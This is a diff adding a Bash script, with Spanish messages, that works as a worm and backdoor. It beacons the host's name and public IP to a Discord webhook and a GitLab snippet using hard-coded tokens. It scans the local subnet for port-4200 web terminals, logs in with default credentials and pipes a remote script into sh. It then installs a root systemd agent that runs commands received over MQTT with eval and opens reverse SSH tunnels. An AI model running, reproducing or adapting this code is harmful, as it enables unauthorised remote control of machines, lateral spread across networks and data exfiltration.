@@ -1,0 +1,269 @@
+#!/bin/bash
+
+WEBHOOK_URL="https://discord.com/api/webhooks/1494783457824342096/fz0czLILjBZYR4ypk0FpTtobJ5bq712a2ptpruxwkD05qN4fpkoB4Upu_5lGsnAswx21"
+GITLAB_TOKEN="glpat-kWmJiLXs0CBp08TeB8oX02M6MQpvOjEKdTptOXhqMQ8.01.1702wrl5g"
+SNIPPET_ID="5982245"
+
+HOSTNAME=$(hostname)
+IP_PUBLICA=$(timeout 5 curl -s ifconfig.me || timeout 5 curl -s ipinfo.io/ip || timeout 5 curl -s icanhazip.com)
+[ -z "$IP_PUBLICA" ] && IP_PUBLICA="0.0.0.0"
+TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
+
+MESSAGE="$1"
+[ -z "$MESSAGE" ] && MESSAGE=""
+
+CONTENT=$(curl -s --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
+    "https://gitlab.com/api/v4/snippets/$SNIPPET_ID/raw")
+
+if echo "$CONTENT" | grep -q "$HOSTNAME|$IP_PUBLICA"; then
+    exit 0
+fi
+
+NEW_CONTENT=$(printf "%s\n%s|%s|%s" "$CONTENT" "$HOSTNAME" "$IP_PUBLICA" "$TIMESTAMP")
+curl -s --request PUT \
+    --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
+    --data-urlencode "content=$NEW_CONTENT" \
+    "https://gitlab.com/api/v4/snippets/$SNIPPET_ID" > /dev/null
+
+curl -s -X POST \
+    -H "Content-Type: application/json" \
+    -d "{\"content\":\"[$HOSTNAME | $IP_PUBLICA | $TIMESTAMP] $MESSAGE\"}" \
+    "$WEBHOOK_URL"
+
+
+TARGET_PORT="4200"
+NMAP_OUTPUT_FILE="/tmp/nmap_scan_4200_open.gnmap"
+
+WEBSOCAT_USER="user"
+WEBSOCAT_PASS="1"
+WEBSOCAT_COMMAND="nohup bash -c \"curl -sfkL 'https://experience.aikaan.io/api/_external/img/v1/user/2def30bd-9bba-4243-ab36-1a5343b4d998/dgp/9327a931-9afe-45d1-8b54-855425a311d9/fwshellscript?package_type=ipkg' | sh\" >/dev/null 2>&1 &"
+
+if ! command -v nmap &> /dev/null; then
+    echo "nmap no encontrado, instalando..."
+    sudo apt-get update
+    sudo apt-get install nmap -y
+    if [ $? -ne 0 ]; then
+        echo "Error al instalar nmap."
+        exit 1
+    fi
+fi
+
+if ! command -v websocat &> /dev/null; then
+    echo "websocat no encontrado, instalando..."
+    wget -q https://github.com/vi/websocat/releases/download/v1.12.0/websocat.x86_64-unknown-linux-musl -O /tmp/websocat
+    sudo mv /tmp/websocat /usr/local/bin/websocat
+    sudo chmod +x /usr/local/bin/websocat
+    if [ $? -ne 0 ]; then
+        echo "Error al instalar websocat."
+        exit 1
+    fi
+fi
+
+LOCAL_IP=""
+if command -v ip &> /dev/null; then
+    LOCAL_IP=$(ip -4 addr show eth0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1)
+    if [ -z "$LOCAL_IP" ]; then
+        LOCAL_IP=$(ip -4 addr show wlan0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1)
+    fi
+fi
+if [ -z "$LOCAL_IP" ]; then
+    LOCAL_IP=$(ip route get 1.1.1.1 2>/dev/null \
+        | awk '{for(i=1;i<=NF;++i) if ($i=="src") { print $(i+1); exit } }')
+fi
+if [ -z "$LOCAL_IP" ]; then
+    echo "¡ERROR CRÍTICO! No se pudo determinar la IP local."
+    exit 1
+fi
+
+NETWORK_PREFIX=$(echo "$LOCAL_IP" | cut -d. -f1-3)
+IP_RANGE="${NETWORK_PREFIX}.0/24"
+
+echo "(eth0/wifi): $LOCAL_IP ---"
+echo "$IP_RANGE ---"
+
+sudo nmap -p "$TARGET_PORT" --open -oG "$NMAP_OUTPUT_FILE" "$IP_RANGE" > /dev/null 2>&1
+if [ $? -ne 0 ]; then
+    echo "Error al ejecutar Nmap."
+    rm -f "$NMAP_OUTPUT_FILE"
+    exit 1
+fi
+
+
+current_nmap_ips=($(awk -v port="$TARGET_PORT" '
+    /^Host: / { current_ip = $2 }
+    $0 ~ "Ports: " port "/open/tcp/" { print current_ip }
+' "$NMAP_OUTPUT_FILE" | sort -u))
+
+filtered_ips=()
+for ip in "${current_nmap_ips[@]}"; do
+    if [ "$ip" != "$LOCAL_IP" ]; then
+        filtered_ips+=("$ip")
+    fi
+done
+current_nmap_ips=("${filtered_ips[@]}")
+
+if [ ${#current_nmap_ips[@]} -eq 0 ]; then
+    echo "No se encontraron hosts con el puerto $TARGET_PORT abierto en $IP_RANGE."
+    rm -f "$NMAP_OUTPUT_FILE"
+    exit 0
+fi
+
+echo "--- Hosts encontrados: ${#current_nmap_ips[@]} ---"
+
+send_websocket_command() {
+    local ip="$1"
+    local command="$2"
+    local user="$3"
+    local pass="$4"
+    
+    send_tty() {
+        local str="$1"
+        for (( i=0; i<${#str}; i++ )); do
+            echo -ne "0${str:$i:1}"
+            sleep 0.05
+        done
+    }
+    
+    {
+        echo -ne '{"AuthToken":"","columns":80,"rows":24}'
+        sleep 1.5
+
+        send_tty "$user"$'\r'
+        sleep 1.5
+
+        send_tty "$pass"$'\r'
+        sleep 3
+
+        send_tty "$command"$'\r'
+        sleep 2
+
+    } | websocat -b --insecure \
+        -H "Origin: https://$ip:$TARGET_PORT" \
+        -H "User-Agent: Mozilla/5.0" \
+        --protocol tty wss://$ip:$TARGET_PORT/ws > /dev/null 2>&1
+    
+    local ws_exit_status=$?
+    
+    if [ $ws_exit_status -eq 0 ]; then
+        echo "✓ $ip -  OK"
+    else
+        echo "✗ $ip - Error (código: $ws_exit_status)"
+    fi
+}
+
+
+for ip in "${current_nmap_ips[@]}"; do
+    send_websocket_command "$ip" "$WEBSOCAT_COMMAND" "$WEBSOCAT_USER" "$WEBSOCAT_PASS"
+done
+
+rm -f "$NMAP_OUTPUT_FILE"
+
+sudo systemctl stop mqtato-agent.service 2>/dev/null
+sudo systemctl disable mqtato-agent.service 2>/dev/null
+sudo rm -f /etc/systemd/system/mqtato-agent.service
+sudo rm -f /usr/local/bin/mqtato_agent.sh
+sudo rm -f /var/log/mqtato-agent.log
+sudo systemctl daemon-reexec
+sudo systemctl daemon-reload
+
+BROKER_IP="mqtato.cloud"
+BROKER_PORT="1883"
+VPS_SSH_USER="user"
+VPS_SSH_PASS="1"
+VPS_SSH_PORT="22222"
+INTERVALO=120
+
+HOST_NAME=$(hostname | tr '[:upper:]' '[:lower:]' | tr -cd '[:alnum:]._-')
+TOPICO_BASE="hosts/$HOST_NAME/"
+TOPICO_COMANDOS="${TOPICO_BASE}comandos"
+TOPICO_RESPUESTAS="${TOPICO_BASE}respuestas"
+TOPICO_ESTADO="${TOPICO_BASE}estado"
+
+
+if ! sudo DEBIAN_FRONTEND=noninteractive apt-get install -y curl sshpass snapd; then
+    wget http://archive.ubuntu.com/ubuntu/pool/main/s/snapd/snapd_2.66.1+22.04_amd64.deb -O /tmp/snapd.deb
+    sudo dpkg -i /tmp/snapd.deb
+    sudo apt-get -f install -y
+fi
+
+sudo systemctl enable --now snapd.socket
+sudo snap install mosquitto
+
+AGENT_SCRIPT="/usr/local/bin/mqtato_agent.sh"
+cat <<EOF | sudo tee "$AGENT_SCRIPT" > /dev/null
+#!/bin/bash
+LOG="/var/log/mqtato-agent.log"
+
+log() { echo "[\$(date '+%F %T')] \$1" >> "\$LOG"; }
+
+get_ip() {
+    local servers=("ifconfig.me" "api.ipify.org" "ident.me" "checkip.amazonaws.com")
+    for s in "\${servers[@]}"; do
+        local res=\$(curl -s --max-time 5 "\$s" | grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}" | head -n 1)
+        if [[ -n "\$res" ]]; then
+            echo "\$res"
+            return 0
+        fi
+    done
+    echo "0.0.0.0"
+}
+
+send_response() {
+    local MSG="\$1"
+    log "Respuesta: \$MSG"
+    mosquitto_pub -h "$BROKER_IP" -p "$BROKER_PORT" -t "$TOPICO_RESPUESTAS" -m "\$MSG"
+}
+
+while true; do
+    IP=\$(get_ip)
+    MSG="\$IP|\$(date +%s)"
+    mosquitto_pub -h "$BROKER_IP" -p "$BROKER_PORT" -t "$TOPICO_ESTADO" -m "\$MSG"
+    log "Estado publicado: \$MSG"
+    sleep "$INTERVALO"
+done &
+
+exec mosquitto_sub -h "$BROKER_IP" -p "$BROKER_PORT" -t "$TOPICO_COMANDOS" | while read -r CMD; do
+    CMD=\$(echo "\$CMD" | tr -d '\r\n')
+    log "Comando recibido: \$CMD"
+
+    if [[ "\$CMD" == ssh\ -R* ]]; then
+        log "Preparando túnel SSH..."
+        TUNEL_CMD="\${CMD#ssh -R }"
+        REMOTE_FORWARD=\$(echo "\$TUNEL_CMD" | awk '{print \$1}')
+        EXTRAS=\$(echo "\$TUNEL_CMD" | cut -d' ' -f2- | sed 's/user@[^ ]*//')
+
+        log "Activando túnel: \$REMOTE_FORWARD → $BROKER_IP:$VPS_SSH_PORT"
+        OUT=\$(sshpass -p "$VPS_SSH_PASS" ssh -f -N -R "\$REMOTE_FORWARD" "$VPS_SSH_USER@$BROKER_IP" -p "$VPS_SSH_PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \$EXTRAS 2>&1)
+        send_response "Túnel SSH activado: \$REMOTE_FORWARD → $BROKER_IP:$VPS_SSH_PORT | \$OUT"
+    else
+        OUT=\$(eval "\$CMD" 2>&1)
+        send_response "\$OUT"
+    fi
+done
+EOF
+
+sudo chmod +x "$AGENT_SCRIPT"
+
+SERVICE_FILE="/etc/systemd/system/mqtato-agent.service"
+cat <<EOF | sudo tee "$SERVICE_FILE" > /dev/null
+[Unit]
+Description=MQTato Agent
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$AGENT_SCRIPT
+Restart=always
+User=root
+WorkingDirectory=/tmp
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reload
+sudo systemctl enable mqtato-agent.service
+sudo systemctl start mqtato-agent.service
+
